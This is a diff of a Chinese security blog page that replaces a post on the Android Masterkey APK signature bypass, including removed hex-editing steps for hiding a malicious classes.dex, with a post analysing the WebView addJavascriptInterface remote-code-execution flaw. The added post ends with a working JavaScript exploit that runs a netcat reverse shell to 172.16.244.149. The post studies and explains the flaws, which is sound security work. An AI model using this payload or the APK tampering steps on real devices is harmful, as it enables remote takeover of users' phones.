@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Android Masterkey #9695860 原理简述与测试 | toOrto’s 南瓜屋</title>
+    <title>toOrto’s 南瓜屋</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="toOrto">
@@ -13,23 +13,24 @@
     
     <meta name="keywords" content="逆向,Android,漏洞,CTF,python,安全">
     
-    <meta name="description" content="注: 本文谢绝任何形式的转载，仅供学习交流
-漏洞简介本漏洞可以实现任意修改dex文件，绕过Android签名验证机制，即在合法应用中注入恶意代码而不被发现
-漏洞原理简述android在解析Zip包时，由于JAVA和C在处理Extra field length时不同，所以产生了这个漏洞。JAVA将Extra field length视为有符号数，而C++将其视为无符号数。所以产生了两种解析方式。">
+    <meta name="description" content="android_webviewwrite by to0rto
+漏洞简介
+在 Android 手机中内置了一款高性能 webkit 内核浏览器,在 SDK 中封装为一个叫做 WebView 组件。这个组件用于控制网页浏览。可以通过webview来设置属性，比如颜色、字体等。
+在webView 下有一个非常特殊的接口函数addJavascriptInterface。能实现本地java和js的交互。利用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Android Masterkey #9695860 原理简述与测试">
-<meta property="og:url" content="http://to0rto.com/2015/04/16/Android-Masterkey-9695860/index.html">
+<meta property="og:title" content="toOrto’s 南瓜屋">
+<meta property="og:url" content="http://to0rto.com/2015/05/27/Android-webview-addJavaScript远程代码执行漏洞分析与测试/index.html">
 <meta property="og:site_name" content="toOrto’s 南瓜屋">
-<meta property="og:description" content="注: 本文谢绝任何形式的转载，仅供学习交流
-漏洞简介本漏洞可以实现任意修改dex文件，绕过Android签名验证机制，即在合法应用中注入恶意代码而不被发现
-漏洞原理简述android在解析Zip包时，由于JAVA和C在处理Extra field length时不同，所以产生了这个漏洞。JAVA将Extra field length视为有符号数，而C++将其视为无符号数。所以产生了两种解析方式。">
-<meta property="og:image" content="http://7xilbx.com1.z0.glb.clouddn.com/masterkey22.png">
-<meta property="og:image" content="http://7xilbx.com1.z0.glb.clouddn.com/masterkey2.png">
+<meta property="og:description" content="android_webviewwrite by to0rto
+漏洞简介
+在 Android 手机中内置了一款高性能 webkit 内核浏览器,在 SDK 中封装为一个叫做 WebView 组件。这个组件用于控制网页浏览。可以通过webview来设置属性，比如颜色、字体等。
+在webView 下有一个非常特殊的接口函数addJavascriptInterface。能实现本地java和js的交互。利用">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Android Masterkey #9695860 原理简述与测试">
-<meta name="twitter:description" content="注: 本文谢绝任何形式的转载，仅供学习交流
-漏洞简介本漏洞可以实现任意修改dex文件，绕过Android签名验证机制，即在合法应用中注入恶意代码而不被发现
-漏洞原理简述android在解析Zip包时，由于JAVA和C在处理Extra field length时不同，所以产生了这个漏洞。JAVA将Extra field length视为有符号数，而C++将其视为无符号数。所以产生了两种解析方式。">
+<meta name="twitter:title" content="toOrto’s 南瓜屋">
+<meta name="twitter:description" content="android_webviewwrite by to0rto
+漏洞简介
+在 Android 手机中内置了一款高性能 webkit 内核浏览器,在 SDK 中封装为一个叫做 WebView 组件。这个组件用于控制网页浏览。可以通过webview来设置属性，比如颜色、字体等。
+在webView 下有一个非常特殊的接口函数addJavascriptInterface。能实现本地java和js的交互。利用">
 <meta name="twitter:creator" content="@to0rto.com">
 <link rel="publisher" href="to0rto.com">
 
@@ -92,14 +93,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/04/16/Android-Masterkey-9695860/" title="Android Masterkey #9695860 原理简述与测试" itemprop="url">Android Masterkey #9695860 原理简述与测试</a>
+      <a href="/2015/05/27/Android-webview-addJavaScript远程代码执行漏洞分析与测试/" title="" itemprop="url"></a>
   </h1>
   <p class="article-author">By
        
 		<a href="https://plus.google.com/to0rto.com?rel=author" title="toOrto" target="_blank" itemprop="author">toOrto</a>
 		
   <p class="article-time">
-    <time datetime="2015-04-16T05:12:54.000Z" itemprop="datePublished"> Published 2015-04-16</time>
+    <time datetime="2015-05-27T13:29:58.000Z" itemprop="datePublished"> Published 2015-05-27</time>
     
   </p>
 </header>
@@ -108,34 +109,38 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理简述"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞测试"><span class="toc-number">3.</span> <span class="toc-text">漏洞测试</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#android_webview"><span class="toc-number">1.</span> <span class="toc-text">android_webview</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞测试"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞测试</span></a></li></ol></li></ol>
 		
 		</div>
 		
-		<p><strong>注: 本文谢绝任何形式的转载，仅供学习交流</strong></p>
-<h2 id="漏洞简介">漏洞简介</h2><p>本漏洞可以实现任意修改dex文件，绕过Android签名验证机制，即在合法应用中注入恶意代码而不被发现</p>
-<h2 id="漏洞原理简述">漏洞原理简述</h2><p>android在解析Zip包时，由于JAVA和C在处理Extra field length时不同，所以产生了这个漏洞。JAVA将Extra field length视为有符号数，而C++将其视为无符号数。所以产生了两种解析方式。<a id="more"></a>    </p>
-<h2 id="漏洞测试">漏洞测试</h2><p>首先修改Central directory file header中classes.dex前一个结构的Extra field length为0x8000，如下图绿色框框中所示(前面23 00代表classes.dex前一个结构的文件名长度，即res/drawable-xxhdpi/ic_launcher.png的长度)。<br>这样，当JAVA解析时，即安装时，解析0x8000为负数，则跳过。<br>当C解析时，即加载时，解析0X8000为正数，则会跳过0x8000这么长的区域，因为它将其视为Extra field，跳到下一结构的起始处。<br>修改原来的classes.dex的Extra field length为0x39。因为恶意classes.dex结构（Central directory）长度为0x39。则当解析时会跳过其后紧跟的恶意classes.dex。跳到下一个正常的结构中。<br>下面是两种解析方式：<br>JAVA:<br>…—&gt;res/drawable-xxhdpi/ic_launcher.png—&gt;classes.dex(原来)—&gt;META-INF/MANIFEST—&gt;…—&gt;EOCD(1)<br>C++：<br>…—&gt;res/drawable-xxhdpi/ic_launcher.png—&gt;classes.dex(恶意)—&gt;META-INF/MANIFEST—&gt;…—&gt;EOCD(2)</p>
-<p>如图所示，<img src="http://7xilbx.com1.z0.glb.clouddn.com/masterkey22.png" alt="image"></p>
-<p>复制从classes.dex（恶意）开始，一直到最后的所有十六进制，粘贴到偏移0x8000的位置。  </p>
-<p>最后，修改末尾End of central directory record (EOCD)保证可以正常的索引到前面的结构。<strong>共两处</strong>。一处是EOCD（1）即原APK自己的结尾，另一处为复制得到的，即EOCD(2)。其中0C 00表示文件数，原来是0D，改为0C，因为开始多了一个classes.dex，现在将其隐藏。第二处为Size of central directory (bytes)，计算方法可看wiki百科对zip文件格式的说明。</p>
-<p>修改字段如图所示<img src="http://7xilbx.com1.z0.glb.clouddn.com/masterkey2.png" alt="image"><br>最后测试结果，仍然可以打出自己修改添加的log，就不附图了。</p>
-<p>参考saurik的一系列文章。<br>非常感谢<br><strong>注: 本文谢绝任何形式的转载，仅供学习交流</strong></p>
+		<h1 id="android_webview">android_webview</h1><pre><code><span class="command">write</span> <span class="keyword">by</span> to0rto
+</code></pre><h2 id="漏洞简介">漏洞简介</h2><hr>
+<p>在 Android 手机中内置了一款高性能 webkit 内核浏览器,在 SDK 中封装为一个叫做 WebView 组件。这个组件用于控制网页浏览。可以通过webview来设置属性，比如颜色、字体等。</p>
+<p>在webView 下有一个非常特殊的接口函数addJavascriptInterface。能实现本地java和js的交互。利用addJavascriptInterface这个接口函数可实现穿透webkit控制android 本机。</p>
+<p>WebView 有以下几个函数，目的就是为了显示网页，而且显示在指定区域中。</p>
+<ol>
+<li>LoadUrl直接显示网页内容；</li>
+<li>LoadData显示中文网页内容。</li>
+<li>setJavaScriptEnabled()支持JavaScript。</li>
+</ol>
+<p>一般使用html 来设计应用页面的几乎不可避免的使用到addJavascriptInterface，包含不限于android浏览器。</p>
+<p>在android 代码程序一般是这样使用：</p>
+<figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">settings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">settings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="type">JSInvokeClass</span><span class="literal">()</span>, <span class="string">"js2java"</span>);</span><br></pre></td></tr></table></figure>
+<p>在2014年二月，安全研究员Joshua J. Drak发现并公布了一个在Android WebView中可以被利用的Javascript bridge “searchBoxJavaBridge<em>”， 在Android4.0 ~ Android4.3.1版本中，当BrowserFrame初始化的时候，会创建一个 android.webkit.SearchBoxImpl实例，并将此实例使用“searchBoxJavaBridge</em>”这个名字添加为JavaScript Object，而攻击者可以利用这个实例执行远程代码。</p>
+<h2 id="漏洞原理">漏洞原理</h2><hr>
+<p>当BrowserFrame初始化的时候，会创建一个 android.webkit.SearchBoxImpl 实例，并将此实例使用“searchBoxJavaBridge_”这个名字添加为JavaScript Object，而攻击者可以利用这个实例执行远程代码。而此漏洞的根源是CVE-2012-6636这个漏洞。</p>
+<h2 id="漏洞分析">漏洞分析</h2><hr>
+<p>在Android 4.0-4.3.1版本中，如果调用了webkit引擎系统会默认添加一个叫searchBoxJavaBridge_的接口，</p>
+<p>攻击者可以找到存在“getClass”方法的对象，然后通过反射的机制，得到Java Runtime对象，然后调用静态方法来执行系统命令。</p>
+<h2 id="漏洞测试">漏洞测试</h2><hr>
+<p>原理：遍历所有window的对象，然后找到包含getClass方法的对象,如果存在此方法的对象则说明该接口存在漏洞。</p>
+<p>测试代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">(cmdArgs)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"getClass"</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj]) &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="built_in">window</span>[obj].getClass();</span><br><span class="line">                    <span class="built_in">document</span>.write(<span class="string">'&lt;span style="color:red"&gt;'</span>+obj+<span class="string">'&lt;/span&gt;'</span>);</span><br><span class="line">                    <span class="built_in">document</span>.write(<span class="string">'&lt;br /&gt;'</span>);                    <span class="built_in">window</span>[obj].getClass().forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">check([<span class="string">"/system/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"nc 172.16.244.149 31415|/system/bin/sh|nc 172.16.244.149 9999"</span>]);</span><br></pre></td></tr></table></figure>
   
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/Android/">Android</a>
-</div>
-
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/Vuln/">Vuln</a><a href="/tags/android/">android</a>
-  </div>
 
 </div>
 
@@ -143,7 +148,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://to0rto.com/2015/04/16/Android-Masterkey-9695860/" data-title="Android Masterkey #9695860 原理简述与测试 | toOrto’s 南瓜屋" data-tsina="null" class="share clearfix">
+	  <div data-url="http://to0rto.com/2015/05/27/Android-webview-addJavaScript远程代码执行漏洞分析与测试/" data-title="toOrto’s 南瓜屋" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -157,18 +162,18 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2015/05/14/Android-Master-Key-9950697/" title="Android Masterkey #9950697 原理与测试">
+ <a href="/2015/06/29/Nexus-5-刷Android-4-4-4-笔记/" title="Nexus 5 刷Android 4.4.4 笔记">
   <strong>上一篇：</strong><br/>
   <span>
-  Android Masterkey #9950697 原理与测试</span>
+  Nexus 5 刷Android 4.4.4 笔记</span>
 </a>
 </div>
 
 
 <div class="next">
-<a href="/2015/04/15/Android-masterkey-8219321/"  title="Android masterkey(8219321)原理分析与测试">
+<a href="/2015/05/26/简单程序逆向总结/"  title="简单程序逆向总结">
  <strong>下一篇：</strong><br/> 
- <span>Android masterkey(8219321)原理分析与测试
+ <span>简单程序逆向总结
 </span>
 </a>
 </div>
@@ -177,7 +182,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/04/16/Android-Masterkey-9695860/" data-title="Android Masterkey #9695860 原理简述与测试" data-url="http://to0rto.com/2015/04/16/Android-Masterkey-9695860/"></div>
+	<div class="ds-thread" data-thread-key="2015/05/27/Android-webview-addJavaScript远程代码执行漏洞分析与测试/" data-title="" data-url="http://to0rto.com/2015/05/27/Android-webview-addJavaScript远程代码执行漏洞分析与测试/"></div>
 </section>
 
 
@@ -187,7 +192,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理简述"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞测试"><span class="toc-number">3.</span> <span class="toc-text">漏洞测试</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#android_webview"><span class="toc-number">1.</span> <span class="toc-text">android_webview</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞测试"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞测试</span></a></li></ol></li></ol>
  
   </div>
 
